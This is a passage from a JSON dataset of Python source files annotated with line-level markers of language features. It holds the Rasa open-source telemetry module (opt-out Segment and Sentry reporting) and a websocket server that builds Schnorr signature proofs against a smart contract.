\"RASA_TELEMETRY_DEBUG\"\nTELEMETRY_WRITE_KEY_ENVIRONMENT_VARIABLE = \"RASA_TELEMETRY_WRITE_KEY\"\nEXCEPTION_WRITE_KEY_ENVIRONMENT_VARIABLE = \"RASA_EXCEPTION_WRITE_KEY\"\nTELEMETRY_ID = \"metrics_id\"\nTELEMETRY_ENABLED_BY_DEFAULT = True\nCI_ENVIRONMENT_TELL = [\n    \"bamboo.buildKey\",\n    \"BUILD_ID\",\n    \"BUILD_NUMBER\",\n    \"BUILDKITE\",\n    \"CI\",\n    \"CIRCLECI\",\n    \"CONTINUOUS_INTEGRATION\",\n    \"GITHUB_ACTIONS\",\n    \"HUDSON_URL\",\n    \"JENKINS_URL\",\n    \"TEAMCITY_VERSION\",\n    \"TRAVIS\",\n]\nTRAINING_STARTED_EVENT = \"Training Started\"\nTRAINING_COMPLETED_EVENT = \"Training Completed\"\nTELEMETRY_DISABLED_EVENT = \"Telemetry Disabled\"\nTELEMETRY_DATA_SPLIT_EVENT = \"Training Data Split\"\nTELEMETRY_DATA_VALIDATED_EVENT = \"Training Data Validated\"\nTELEMETRY_DATA_CONVERTED_EVENT = \"Training Data Converted\"\nTELEMETRY_TRACKER_EXPORTED_EVENT = \"Tracker Exported\"\nTELEMETRY_INTERACTIVE_LEARNING_STARTED_EVENT = \"Interactive Learning Started\"\nTELEMETRY_SERVER_STARTED_EVENT = \"Server Started\"\nTELEMETRY_PROJECT_CREATED_EVENT = \"Project Created\"\nTELEMETRY_SHELL_STARTED_EVENT = \"Shell Started\"\nTELEMETRY_RASA_X_LOCAL_STARTED_EVENT = \"Rasa X Local Started\"\nTELEMETRY_VISUALIZATION_STARTED_EVENT = \"Story Visualization Started\"\nTELEMETRY_TEST_CORE_EVENT = \"Model Core Tested\"\nTELEMETRY_TEST_NLU_EVENT = \"Model NLU Tested\"\ndef print_telemetry_reporting_info() -> None:\n    message = textwrap.dedent(\n        f\n    ).strip()\n    table = SingleTable([[message]])\n    print(table.table)\ndef _default_telemetry_configuration(is_enabled: bool) -> Dict[Text, Any]:\n    return {\n        CONFIG_TELEMETRY_ENABLED: is_enabled,\n        CONFIG_TELEMETRY_ID: uuid.uuid4().hex,\n        CONFIG_TELEMETRY_DATE: datetime.now(),\n    }\ndef _write_default_telemetry_configuration(\n    is_enabled: bool = TELEMETRY_ENABLED_BY_DEFAULT,\n) -> bool:\n    new_config = _default_telemetry_configuration(is_enabled)\n    success = rasa_utils.write_global_config_value(\n        CONFIG_FILE_TELEMETRY_KEY, new_config\n    )\n    if is_enabled and success:\n        print_telemetry_reporting_info()\n    return success\ndef _is_telemetry_enabled_in_configuration() -> bool:\n    try:\n        stored_config = rasa_utils.read_global_config_value(\n            CONFIG_FILE_TELEMETRY_KEY, unavailable_ok=False\n        )\n        return stored_config[CONFIG_TELEMETRY_ENABLED]\n    except ValueError as e:\n        logger.debug(f\"Could not read telemetry settings from configuration file: {e}\")\n        success = _write_default_telemetry_configuration()\n        return TELEMETRY_ENABLED_BY_DEFAULT and success\ndef is_telemetry_enabled() -> bool:\n    telemetry_environ = os.environ.get(TELEMETRY_ENABLED_ENVIRONMENT_VARIABLE)\n    if telemetry_environ is None:\n        try:\n            return rasa_utils.read_global_config_value(\n                CONFIG_FILE_TELEMETRY_KEY, unavailable_ok=False\n            )[CONFIG_TELEMETRY_ENABLED]\n        except ValueError:\n            return False\n    else:\n        return telemetry_environ.lower() == \"true\"\ndef initialize_telemetry() -> bool:\n    try:\n        is_enabled_in_configuration = _is_telemetry_enabled_in_configuration()\n        telemetry_environ = os.environ.get(TELEMETRY_ENABLED_ENVIRONMENT_VARIABLE)\n        if telemetry_environ is None:\n            return is_enabled_in_configuration\n        else:\n            return telemetry_environ.lower() == \"true\"\n    except Exception as e:  \n        logger.exception(\n            f\"Failed to initialize telemetry reporting: {e}.\"\n            f\"Telemetry reporting will be disabled.\"\n        )\n        return False\ndef ensure_telemetry_enabled(f: Callable[..., Any]) -> Callable[..., Any]:\n    initialize_telemetry()\n    if asyncio.iscoroutinefunction(f):\n        @wraps(f)\n        async def decorated(*args, **kwargs):\n            if is_telemetry_enabled():\n                return await f(*args, **kwargs)\n            return None\n        return decorated\n    else:\n        @wraps(f)\n        def decorated(*args, **kwargs):\n            if is_telemetry_enabled():\n                return f(*args, **kwargs)\n            return None\n        return decorated\ndef _fetch_write_key(tool: Text, environment_variable: Text) -> Optional[Text]:\n    import pkg_resources\n    from rasa import __name__ as name\n    if os.environ.get(environment_variable):\n        return os.environ.get(environment_variable)\n    write_key_path = pkg_resources.resource_filename(name, \"keys\")\n    try:\n        with open(write_key_path) as f:\n            return json.load(f).get(tool)\n    except Exception:  \n        return None\ndef telemetry_write_key() -> Optional[Text]:\n    return _fetch_write_key(\"segment\", TELEMETRY_WRITE_KEY_ENVIRONMENT_VARIABLE)\ndef sentry_write_key() -> Optional[Text]:\n    return _fetch_write_key(\"sentry\", EXCEPTION_WRITE_KEY_ENVIRONMENT_VARIABLE)\ndef _encode_base64(original: Text, encoding: Text = \"utf-8\") -> Text:\n    import base64\n    return base64.b64encode(original.encode(encoding)).decode(encoding)\ndef segment_request_header(write_key: Text) -> Dict[Text, Any]:\n    return {\n        \"Authorization\": \"Basic {}\".format(_encode_base64(write_key + \":\")),\n        \"Content-Type\": \"application/json\",\n    }\ndef segment_request_payload(\n    distinct_id: Text,\n    event_name: Text,\n    properties: Dict[Text, Any],\n    context: Dict[Text, Any],\n) -> Dict[Text, Any]:\n    return {\n        \"userId\": distinct_id,\n        \"event\": event_name,\n        \"properties\": properties,\n        \"context\": context,\n    }\ndef in_continuous_integration() -> bool:\n    return any(env in os.environ for env in CI_ENVIRONMENT_TELL)\ndef _is_telemetry_debug_enabled() -> bool:\n    return (\n        os.environ.get(TELEMETRY_DEBUG_ENVIRONMENT_VARIABLE, \"false\").lower() == \"true\"\n    )\ndef print_telemetry_event(payload: Dict[Text, Any]) -> None:\n    print(\"Telemetry Event:\")\n    print(json.dumps(payload, indent=2))\ndef _send_event(\n    distinct_id: Text,\n    event_name: Text,\n    properties: Dict[Text, Any],\n    context: Dict[Text, Any],\n) -> None:\n    payload = segment_request_payload(distinct_id, event_name, properties, context)\n    if _is_telemetry_debug_enabled():\n        print_telemetry_event(payload)\n        return\n    write_key = telemetry_write_key()\n    if not write_key:\n        logger.debug(\"Skipping request to external service: telemetry key not set.\")\n        return\n    headers = segment_request_header(write_key)\n    resp = requests.post(\n        SEGMENT_ENDPOINT, headers=headers, json=payload, timeout=SEGMENT_REQUEST_TIMEOUT\n    )\n    if resp.status_code != 200:\n        logger.debug(\n            f\"Segment telemetry request returned a {resp.status_code} response. \"\n            f\"Body: {resp.text}\"\n        )\n    else:\n        data = resp.json()\n        if not data.get(\"success\"):\n            logger.debug(\n                f\"Segment telemetry request returned a failure. Response: {data}\"\n            )\ndef _hash_directory_path(path: Text) -> Optional[Text]:\n    full_path = Path(path).absolute()\n    return hashlib.sha256(str(full_path).encode(\"utf-8\")).hexdigest()\ndef _is_docker() -> bool:\n    try:\n        os.stat(\"/.dockerenv\")\n        return True\n    except Exception:  \n        pass\n    try:\n        return \"docker\" in rasa.shared.utils.io.read_file(\"/proc/self/cgroup\", \"utf8\")\n    except Exception:  \n        return False\ndef with_default_context_fields(\n    context: Optional[Dict[Text, Any]] = None,\n) -> Dict[Text, Any]:\n    context = context or {}\n    return {**_default_context_fields(), **context}\n@functools.lru_cache()\ndef _default_context_fields() -> Dict[Text, Any]:\n    import tensorflow as tf\n    return {\n        \"os\": {\"name\": platform.system(), \"version\": platform.release()},\n        \"ci\": in_continuous_integration(),\n        \"project\": model.project_fingerprint(),\n        \"directory\": _hash_directory_path(os.getcwd()),\n        \"python\": sys.version.split(\" \")[0],\n        \"rasa_open_source\": rasa.__version__,\n        \"gpu\": len(tf.config.list_physical_devices(\"GPU\")),\n        \"cpu\": multiprocessing.cpu_count(),\n        \"docker\": _is_docker(),\n    }\ndef _track(\n    event_name: Text,\n    properties: Optional[Dict[Text, Any]] = None,\n    context: Optional[Dict[Text, Any]] = None,\n) -> None:\n    try:\n        telemetry_id = get_telemetry_id()\n        if not telemetry_id:\n            logger.debug(\"Will not report telemetry events as no ID was found.\")\n            return\n        if not properties:\n            properties = {}\n        properties[TELEMETRY_ID] = telemetry_id\n        _send_event(\n            telemetry_id, event_name, properties, with_default_context_fields(context)\n        )\n    except Exception as e:  \n        logger.debug(f\"Skipping telemetry reporting: {e}\")\ndef get_telemetry_id() -> Optional[Text]:\n    try:\n        telemetry_config = (\n            rasa_utils.read_global_config_value(CONFIG_FILE_TELEMETRY_KEY) or {}\n        )\n        return telemetry_config.get(CONFIG_TELEMETRY_ID)\n    except Exception as e:  \n        logger.debug(f\"Unable to retrieve telemetry ID: {e}\")\n        return None\ndef toggle_telemetry_reporting(is_enabled: bool) -> None:\n    configuration = rasa_utils.read_global_config_value(CONFIG_FILE_TELEMETRY_KEY)\n    if configuration:\n        configuration[CONFIG_TELEMETRY_ENABLED] = is_enabled\n    else:\n        configuration = _default_telemetry_configuration(is_enabled)\n    rasa_utils.write_global_config_value(CONFIG_FILE_TELEMETRY_KEY, configuration)\ndef strip_sensitive_data_from_sentry_event(\n    event: Dict[Text, Any], _unused_hint: Optional[Dict[Text, Any]] = None\n) -> Optional[Dict[Text, Any]]:\n    for value in event.get(\"exception\", {}).get(\"values\", []):\n        for frame in value.get(\"stacktrace\", {}).get(\"frames\", []):\n            frame[\"abs_path\"] = \"\"\n            if f\"rasa_sdk{os.path.sep}executor.py\" in frame[\"filename\"]:\n                return None\n            elif \"site-packages\" in frame[\"filename\"]:\n                relative_name = frame[\"filename\"].split(\"site-packages\")[-1][1:]\n                frame[\"filename\"] = os.path.join(\"site-packages\", relative_name)\n            elif \"dist-packages\" in frame[\"filename\"]:\n                relative_name = frame[\"filename\"].split(\"dist-packages\")[-1][1:]\n                frame[\"filename\"] = os.path.join(\"dist-packages\", relative_name)\n            elif os.path.isabs(frame[\"filename\"]):\n                return None\n    return event\n@ensure_telemetry_enabled\ndef initialize_error_reporting() -> None:\n    import sentry_sdk\n    from sentry_sdk import configure_scope\n    from sentry_sdk.integrations.atexit import AtexitIntegration\n    from sentry_sdk.integrations.dedupe import DedupeIntegration\n    from sentry_sdk.integrations.excepthook import ExcepthookIntegration\n    key = sentry_write_key()\n    if not key:\n        return\n    telemetry_id = get_telemetry_id()\n    sentry_sdk.init(\n        f\"https://{key}.ingest.sentry.io/2801673\",\n        before_send=strip_sensitive_data_from_sentry_event,\n        integrations=[\n            ExcepthookIntegration(),\n            DedupeIntegration(),\n            AtexitIntegration(lambda _, __: None),\n        ],\n        send_default_pii=False,  \n        server_name=telemetry_id or \"UNKNOWN\",\n        ignore_errors=[KeyboardInterrupt, RasaException, NotImplementedError],\n        in_app_include=[\"rasa\"],  \n        with_locals=False,  \n        release=f\"rasa-{rasa.__version__}\",\n        default_integrations=False,\n        environment=\"development\" if in_continuous_integration() else \"production\",\n    )\n    if telemetry_id:\n        with configure_scope() as scope:\n            if hasattr(scope, \"set_user\"):\n                scope.set_user({\"id\": telemetry_id})\n            default_context = _default_context_fields()\n            if hasattr(scope, \"set_context\"):\n                if \"os\" in default_context:\n                    scope.set_context(\"Operating System\", default_context.pop(\"os\"))\n                scope.set_context(\"Environment\", default_context)\n@async_generator.asynccontextmanager\nasync def track_model_training(\n    training_data: \"TrainingDataImporter\", model_type: Text\n) -> typing.AsyncGenerator[None, None]:\n    if not initialize_telemetry():\n        yield  \n        return  \n    config = await training_data.get_config()\n    stories = await training_data.get_stories()\n    nlu_data = await training_data.get_nlu_data()\n    domain = await training_data.get_domain()\n    training_id = uuid.uuid4().hex\n    _track(\n        TRAINING_STARTED_EVENT,\n        {\n            \"language\": config.get(\"language\"),\n            \"training_id\": training_id,\n            \"type\": model_type,\n            \"pipeline\": config.get(\"pipeline\"),\n            \"policies\": config.get(\"policies\"),\n            \"num_intent_examples\": len(nlu_data.intent_examples),\n            \"num_entity_examples\": len(nlu_data.entity_examples),\n            \"num_actions\": len(domain.action_names),\n            \"num_templates\": len(domain.templates),\n            \"num_slots\": len(domain.slots),\n            \"num_forms\": len(domain.forms),\n            \"num_intents\": len(domain.intents),\n            \"num_entities\": len(domain.entities),\n            \"num_story_steps\": len(stories.story_steps),\n            \"num_lookup_tables\": len(nlu_data.lookup_tables),\n            \"num_synonyms\": len(nlu_data.entity_synonyms),\n            \"num_regexes\": len(nlu_data.regex_features),\n        },\n    )\n    start = datetime.now()\n    yield\n    runtime = datetime.now() - start\n    _track(\n        TRAINING_COMPLETED_EVENT,\n        {\n            \"training_id\": training_id,\n            \"type\": model_type,\n            \"runtime\": int(runtime.total_seconds()),\n        },\n    )\n@ensure_telemetry_enabled\ndef track_telemetry_disabled() -> None:\n    _track(TELEMETRY_DISABLED_EVENT)\n@ensure_telemetry_enabled\ndef track_data_split(fraction: float, data_type: Text) -> None:\n    _track(TELEMETRY_DATA_SPLIT_EVENT, {\"fraction\": fraction, \"type\": data_type})\n@ensure_telemetry_enabled\ndef track_validate_files(validation_success: bool) -> None:\n    _track(TELEMETRY_DATA_VALIDATED_EVENT, {\"validation_success\": validation_success})\n@ensure_telemetry_enabled\ndef track_data_convert(output_format: Text, data_type: Text) -> None:\n    _track(\n        TELEMETRY_DATA_CONVERTED_EVENT,\n        {\"output_format\": output_format, \"type\": data_type},\n    )\n@ensure_telemetry_enabled\ndef track_tracker_export(\n    number_of_exported_events: int,\n    tracker_store: \"TrackerStore\",\n    event_broker: \"EventBroker\",\n) -> None:\n    _track(\n        TELEMETRY_TRACKER_EXPORTED_EVENT,\n        {\n            \"number_of_exported_events\": number_of_exported_events,\n            \"tracker_store\": type(tracker_store).__name__,\n            \"event_broker\": type(event_broker).__name__,\n        },\n    )\n@ensure_telemetry_enabled\ndef track_interactive_learning_start(\n    skip_visualization: bool, save_in_e2e: bool\n) -> None:\n    _track(\n        TELEMETRY_INTERACTIVE_LEARNING_STARTED_EVENT,\n        {\"skip_visualization\": skip_visualization, \"save_in_e2e\": save_in_e2e},\n    )\n@ensure_telemetry_enabled\ndef track_server_start(\n    input_channels: List[\"InputChannel\"],\n    endpoints: Optional[\"AvailableEndpoints\"],\n    model_directory: Optional[Text],\n    number_of_workers: int,\n    is_api_enabled: bool,\n) -> None:\n    from rasa.core.utils import AvailableEndpoints\n    def project_fingerprint_from_model(\n        _model_directory: Optional[Text],\n    ) -> Optional[Text]:\n        if _model_directory:\n            try:\n                with model.get_model(_model_directory) as unpacked_model:\n                    fingerprint = model.fingerprint_from_path(unpacked_model)\n                    return fingerprint.get(model.FINGERPRINT_PROJECT)\n            except Exception:\n                return None\n        return None\n    if not endpoints:\n        endpoints = AvailableEndpoints()\n    _track(\n        TELEMETRY_SERVER_STARTED_EVENT,\n        {\n            \"input_channels\": [i.name() for i in input_channels],\n            \"api_enabled\": is_api_enabled,\n            \"number_of_workers\": number_of_workers,\n            \"endpoints_nlg\": endpoints.nlg.type if endpoints.nlg else None,\n            \"endpoints_nlu\": endpoints.nlu.type if endpoints.nlu else None,\n            \"endpoints_action_server\": endpoints.action.type\n            if endpoints.action\n            else None,\n            \"endpoints_model_server\": endpoints.model.type if endpoints.model else None,\n            \"endpoints_tracker_store\": endpoints.tracker_store.type\n            if endpoints.tracker_store\n            else None,\n            \"endpoints_lock_store\": endpoints.lock_store.type\n            if endpoints.lock_store\n            else None,\n            \"endpoints_event_broker\": endpoints.event_broker.type\n            if endpoints.event_broker\n            else None,\n            \"project\": project_fingerprint_from_model(model_directory),\n        },\n    )\n@ensure_telemetry_enabled\ndef track_project_init(path: Text) -> None:\n    _track(\n        TELEMETRY_PROJECT_CREATED_EVENT, {\"init_directory\": _hash_directory_path(path)},\n    )\n@ensure_telemetry_enabled\ndef track_shell_started(model_type: Text) -> None:\n    _track(TELEMETRY_SHELL_STARTED_EVENT, {\"type\": model_type})\n@ensure_telemetry_enabled\ndef track_rasa_x_local() -> None:\n    _track(TELEMETRY_RASA_X_LOCAL_STARTED_EVENT)\n@ensure_telemetry_enabled\ndef track_visualization() -> None:\n    _track(TELEMETRY_VISUALIZATION_STARTED_EVENT)\n@ensure_telemetry_enabled\ndef track_core_model_test(num_story_steps: int, e2e: bool, agent: \"Agent\") -> None:\n    fingerprint = model.fingerprint_from_path(agent.model_directory or \"\")\n    project = fingerprint.get(model.FINGERPRINT_PROJECT)\n    _track(\n        TELEMETRY_TEST_CORE_EVENT,\n        {\"project\": project, \"end_to_end\": e2e, \"num_story_steps\": num_story_steps},\n    )\n@ensure_telemetry_enabled\ndef track_nlu_model_test(test_data: \"TrainingData\") -> None:\n    _track(\n        TELEMETRY_TEST_NLU_EVENT,\n        {\n            \"num_intent_examples\": len(test_data.intent_examples),\n            \"num_entity_examples\": len(test_data.entity_examples),\n            \"num_lookup_tables\": len(test_data.lookup_tables),\n            \"num_synonyms\": len(test_data.entity_synonyms),\n            \"num_regexes\": len(test_data.regex_features),\n        },\n    )",
            "patterns": {
                "pep_468": [
                    [
                        142,
                        "f(*args, **kwargs)"
                    ],
                    [
                        149,
                        "f(*args, **kwargs)"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_563": [
                    [
                        347,
                        "    training_data: \"TrainingDataImporter\", model_type: Text",
                        "quoted annotation"
                    ],
                    [
                        408,
                        "    tracker_store: \"TrackerStore\",",
                        "quoted annotation"
                    ],
                    [
                        409,
                        "    event_broker: \"EventBroker\",",
                        "quoted annotation"
                    ],
                    [
                        488,
                        "def track_core_model_test(num_story_steps: int, e2e: bool, agent: \"Agent\") -> None:",
                        "quoted annotation"
                    ],
                    [
                        496,
                        "def track_nlu_model_test(test_data: \"TrainingData\") -> None:",
                        "quoted annotation"
                    ]
                ],
                "pep_585": [
                    [
                        15,
                        "from typing import Any, Callable, Dict, List, Optional, Text",
                        "suggestion"
                    ],
                    [
                        15,
                        "from typing import Any, Callable, Dict, List, Optional, Text",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        85,
                        "def _default_telemetry_configuration(is_enabled: bool) -> Dict[Text, Any]:",
                        "violation"
                    ],
                    [
                        170,
                        "def segment_request_header(write_key: Text) -> Dict[Text, Any]:",
                        "violation"
                    ],
                    [
                        175,
                        "def segment_request_payload(",
                        "violation"
                    ],
                    [
                        178,
                        "    properties: Dict[Text, Any],",
                        "violation"
                    ],
                    [
                        179,
                        "    context: Dict[Text, Any],",
                        "violation"
                    ],
                    [
                        193,
                        "def print_telemetry_event(payload: Dict[Text, Any]) -> None:",
                        "violation"
                    ],
                    [
                        199,
                        "    properties: Dict[Text, Any],",
                        "violation"
                    ],
                    [
                        200,
                        "    context: Dict[Text, Any],",
                        "violation"
                    ],
                    [
                        238,
                        "def with_default_context_fields(",
                        "violation"
                    ],
                    [
                        244,
                        "def _default_context_fields() -> Dict[Text, Any]:",
                        "violation"
                    ],
                    [
                        292,
                        "    event: Dict[Text, Any], _unused_hint: Optional[Dict[Text, Any]] = None",
                        "violation"
                    ],
                    [
                        429,
                        "    input_channels: List[\"InputChannel\"],",
                        "violation"
                    ]
                ],
                "pep_525": [
                    [
                        346,
                        389,
                        "async generator",
                        "async def track_model_training(\n    training_data: \"TrainingDataImporter\", model_type: Text\n) -> typing.AsyncGenerator[None, None]:\n    if not initialize_telemetry():\n        yield  \n        return  \n    config = await training_data.get_config()\n    stories = await training_data.get_stories()\n    nlu_data = await training_data.get_nlu_data()\n    domain = await training_data.get_domain()\n    training_id = uuid.uuid4().hex\n    _track(\n        TRAINING_STARTED_EVENT,\n        {\n            \"language\": config.get(\"language\"),\n            \"training_id\": training_id,\n            \"type\": model_type,\n            \"pipeline\": config.get(\"pipeline\"),\n            \"policies\": config.get(\"policies\"),\n            \"num_intent_examples\": len(nlu_data.intent_examples),\n            \"num_entity_examples\": len(nlu_data.entity_examples),\n            \"num_actions\": len(domain.action_names),\n            \"num_templates\": len(domain.templates),\n            \"num_slots\": len(domain.slots),\n            \"num_forms\": len(domain.forms),\n            \"num_intents\": len(domain.intents),\n            \"num_entities\": len(domain.entities),\n            \"num_story_steps\": len(stories.story_steps),\n            \"num_lookup_tables\": len(nlu_data.lookup_tables),\n            \"num_synonyms\": len(nlu_data.entity_synonyms),\n            \"num_regexes\": len(nlu_data.regex_features),\n        },\n    )\n    start = datetime.now()\n    yield\n    runtime = datetime.now() - start\n    _track(\n        TRAINING_COMPLETED_EVENT,\n        {\n            \"training_id\": training_id,\n            \"type\": model_type,\n            \"runtime\": int(runtime.total_seconds()),\n        },\n    )"
                    ]
                ],
                "pep_498v": [
                    [
                        172,
                        172,
                        ".format()"
                    ]
                ],
                "pep_498": [
                    [
                        320,
                        "        f\"https://{key}.ingest.sentry.io/2801673\","
                    ],
                    [
                        216,
                        "            f\"Segment telemetry request returned a {resp.status_code} response. \""
                    ],
                    [
                        332,
                        "        release=f\"rasa-{rasa.__version__}\","
                    ],
                    [
                        108,
                        "        logger.debug(f\"Could not read telemetry settings from configuration file: {e}\")"
                    ],
                    [
                        132,
                        "            f\"Failed to initialize telemetry reporting: {e}.\""
                    ],
                    [
                        223,
                        "                f\"Segment telemetry request returned a failure. Response: {data}\""
                    ],
                    [
                        274,
                        "        logger.debug(f\"Skipping telemetry reporting: {e}\")"
                    ],
                    [
                        282,
                        "        logger.debug(f\"Unable to retrieve telemetry ID: {e}\")"
                    ],
                    [
                        297,
                        "            if f\"rasa_sdk{os.path.sep}executor.py\" in frame[\"filename\"]:"
                    ]
                ]
            }
        },
        "37": {
            "file": "from web3 import Web3, HTTPProvider, IPCProvider, WebsocketProvider\nfrom pysolcrypto.altbn128 import randsn, addmodp, asint\nfrom pysolcrypto.schnorr import *\nfrom pysolcrypto.curve import *\nfrom pysolcrypto.utils import *\nfrom eth_keys import keys\nimport datetime\nimport time\nimport json\nimport asyncio\nimport websockets\nimport plyvel\nimport logging\nlogging.basicConfig()\nSTATE = {'value': 0}\nCLIENTS = {}\nCONDITIONS = {}\nDATASOURCE = {}\ndef state_event():\n  return json.dumps({'type': 'state', **STATE})\ndef users_event():\n  return json.dumps({'type': 'users', 'count': len(USERS)})\nasync def notify_state():\n  if USERS:       \n    message = state_event()\n    await asyncio.wait([user.send(message) for user in USERS])\nasync def notify_users():\n  if USERS:       \n    message = users_event()\n    await asyncio.wait([user.send(message) for user in USERS])\nasync def hello(client):\n  message = json.dumps({'cmd_id':'hello'})\n  await asyncio.wait(client.send(message))\nasync def bye(client):\n  message = json.dumps({'cmd_id':'bye'})\n  await client.send(message) \nasync def register(address,client):\n  global CLIENTS\n  if address in DATASOURCE:\n    message = json.dumps({'cmd_id':'registered'})\n    CLIENTS[uid(client)] = {}\n    CLIENTS[uid(client)]['socket'] = client\n    CLIENTS[uid(client)]['address'] = address\n    CLIENTS[uid(client)]['pubkey'] = myContract.functions.getPubkeyByAddress(address).call()\n    CLIENTS[uid(client)]['handlers'] = {}\n    CLIENTS[uid(client)]['handlers_data'] = {}\n    CLIENTS[uid(client)]['handlers_id'] = 0\n    CLIENTS[uid(client)]['condition'] = []\n    for cond in DATASOURCE[address]:\n      getConditionInfo(client,cond)\n  else:\n    message = json.dumps({'cmd_id':'unregistered'})\n  await client.send(message)\nasync def unregister(address,client):\n  try:\n    del CLIENTS[address]\n  except KeyError:\n      print(\"Client not found\")\nasync def send_data(websocket,save_data,msg,msg_type,handler_name):\n  global CLIENTS\n  cuid = uid(websocket)\n  if (msg_type == 'Commit'):   \n    CLIENTS[cuid]['handlers_id'] += 1\n  CLIENTS[cuid]['handlers']['i_'+str(CLIENTS[cuid]['handlers_id'])+'_'+msg_type] = handler_name;\n  CLIENTS[cuid]['handlers_data']['i_'+str(CLIENTS[cuid]['handlers_id'])+'_'+msg_type] = save_data; \n  message = json.dumps({'cmd_id':CLIENTS[cuid]['handlers_id'], 'type':msg_type, 'data':msg})\n  await websocket.send(message)\nasync def _commit_handler(client,data,response):\n  try:\n    D = makepoint(CLIENTS[uid(client)]['pubkey'])\n    res = json.loads(response['data'])\n    save_data = {}\n    RD = stringtopoint(res['RD'])\n    XD = stringtopoint(res['XD'])\n    XW = data['XW']\n    xW = data['xW']\n    RW = data['RW']\n    v = data['v']\n    rW = data['rW']\n    L = hashsn(D[0].n,D[1].n,XD[0].n,XD[1].n,XW[0].n,XW[1].n)\n    HD = multiply(D,hashsn(L,D[0].n,D[1].n))\n    HXD = multiply(XD,hashsn(L,XD[0].n,XD[1].n))\n    hxw = mulmodn(xW,hashsn(L,XW[0].n,XW[1].n))\n    HXW = sbmul(hxw)\n    X = add(HD,add(HXD,HXW))\n    R = add(RD,RW)\n    save_data['Ccl'] = makepoint([0,0])\n    save_data['Cch'] = makepoint([0,0])\n    for cond in CLIENTS[uid(client)]['condition']:\n      Y = cond['Y']\n      if (cond['type'] == 1): \n        vl = cond['v']\n        Cc = add(Y,HXW)\n        Cc = negp(Cc)\n        Cc = add(Cc,multiply(D,v-vl))\n        save_data['Ccl'] = Cc\n      elif (cond['type'] == 2): \n        vh = cond['v']\n        Cc = add(Y,HXW)\n        Cc = add(Cc,multiply(D,vh-v))\n        save_data['Cch'] = Cc\n    save_data['X'] = X\n    save_data['R'] = R\n    save_data['XW'] = XW\n    save_data['hxw'] = hxw   \n    save_data['rW'] = rW\n    save_data['XD'] = XD\n    msg = json.dumps({'token':myToken,'Ccl':pointtostring(save_data['Ccl']),'Cch':pointtostring(save_data['Cch'])})\n    await send_data(client,save_data,msg,'Sign','sign_handler')\n  except Exception as e:\n    print('asdf',e)\nasync def _sign_handler(client,data,response):\n  try:\n    D = makepoint(CLIENTS[uid(client)]['pubkey'])\n    res = json.loads(response['data'])\n    sD = int(res['sD'],16)\n    CD = stringtopoint(res['CD'])\n    X = data['X']\n    R = data['R']\n    XD = data['XD']\n    XW = data['XW']\n    hxw = data['hxw']\n    rW = data['rW']\n    message = {'token':myToken,'CD':pointtostring(CD),'Ccl':pointtostring(data['Ccl']),'Cch':pointtostring(data['Cch']),'D':pointtostring(D),'XD':pointtostring(XD),'XW':pointtostring(XW)} \n    hm = bytes_to_int(keccak_256(json.dumps(message).encode('utf-8')).digest())     \n    HXRM = hashsn(X[0].n,X[1].n,R[0].n,R[1].n,hm) \n    print('---------')\n    print(message)\n    print(X)\n    print('---------')\n    eW = mulmodn(HXRM,hxw) \n    sW = addmodn(rW,eW)\n    s = addmodn(sD,sW)\n    proof = json.dumps({'message':message,'R':pointtostring(R),'s':hex(s)})\n    print (\"-----------Proof constructed at \" + str(datetime.datetime.now()))\n    await ask_device(proof)\n  except Exception as e:\n    print('fdsa',e)\nhandlers = {\n    'commit_handler': _commit_handler,\n    'sign_handler': _sign_handler,\n}\nasync def evaluate(v,client):\n  ok = 0\n  for cond in CLIENTS[uid(client)]['condition']:\n    if (cond['type']==1) and (cond['v']<=v): \n      ok += 1\n    elif (cond['type']==2) and (v<=cond['v']): \n      ok += 1\n    else:\n      return\n  if (ok==len(CLIENTS[uid(client)]['condition'])):\n    print (\"\\n-----------Triggered at \" + str(datetime.datetime.now()))\n    xW = randsn()\n    rW = randsn()\n    XW = sbmul(xW)\n    RW = sbmul(rW)\n    msg = json.dumps({'XW':pointtostring(XW),'RW':pointtostring(RW)})\n    save_data = {};\n    save_data['XW'] = XW;\n    save_data['xW'] = xW;\n    save_data['RW'] = RW;\n    save_data['rW'] = rW;\n    save_data['v'] = v;\n    await send_data(client,save_data,msg,'Commit','commit_handler')\n    print('request sent')\nasync def listen(websocket, path):\n  try:\n    async for message in websocket:\n      data = json.loads(message)\n      cmd_id = data['cmd_id']\n      if (cmd_id == 'hello'):\n        client_address = data['address']\n        await register(client_address,websocket)\n      elif (cmd_id == 'val'):\n        v = data['data']\n        await evaluate(v, websocket)    \n      else:\n        global CLIENTS\n        cuid = uid(websocket)\n        hdl = CLIENTS[cuid]['handlers']['i_'+str(data['cmd_id'])+'_'+data['type']];\n        handler_data = CLIENTS[cuid]['handlers_data']['i_'+str(data['cmd_id'])+'_'+data['type']];\n        await handlers[hdl](websocket,handler_data,data);\n  finally:\n      await unregister(uid(websocket),websocket)\nasync def ask_device(proof):\n  async with websockets.connect(\n          'ws://192.168.2.71:8765') as websocket:\n      await websocket.send(proof)\n      response = await websocket.recv()\n      print(response)\n      print (\"-----------Finished at \" + str(datetime.datetime.now()))\ndef getConditionInfo(client,cond):\n  db = plyvel.DB('./node/watcher-db/', create_if_missing=True)                                                                       \n  info = str(db.get(bytes(str(cond),'utf-8')),'utf-8')\n  jsinfo = json.loads(info)\n  v = jsinfo['value']*jsinfo['scale']\n  t = jsinfo['type']\n  y = int(jsinfo['bf'],16)\n  Y = sbmul(y)\n  condInfo = {'condhash': cond,'v':v,'type':t,'Y':Y}\n  CLIENTS[uid(client)]['condition'].append(condInfo)\n  db.close()\ndef uid(websocket):\n  return websocket.remote_address[0]+':'+str(websocket.remote_address[1])\nweb3 = Web3(HTTPProvider('http://192.168.2.218:7545'))\ncontractAddress = \"0x4FF6ded1234558A8d384CF868ABC390aaE04EC46\"\nwith open(\"./node/ABI.json\", 'r') as f:\n     contract_abi = json.load(f)\nmyContract = web3.eth.contract(address=contractAddress, abi=contract_abi)\nprint(myContract)\nmyToken = 0x1989\ndb = plyvel.DB('./node/watcher-db/', create_if_missing=True)\ncondList = myContract.functions.getConditionsByToken(myToken).call()\nfor cond in condList:\n  print(cond)\n  datasource = myContract.functions.getDatasourceByCondition(cond).call()\n  if datasource in DATASOURCE:\n    DATASOURCE[datasource].append(cond)\n  else:\n    DATASOURCE[datasource] = []\n    DATASOURCE[datasource].append(cond)\n  print(db.get(bytes(str(cond),'utf-8')))\ndb.close()\nprint(\"ACTIVE 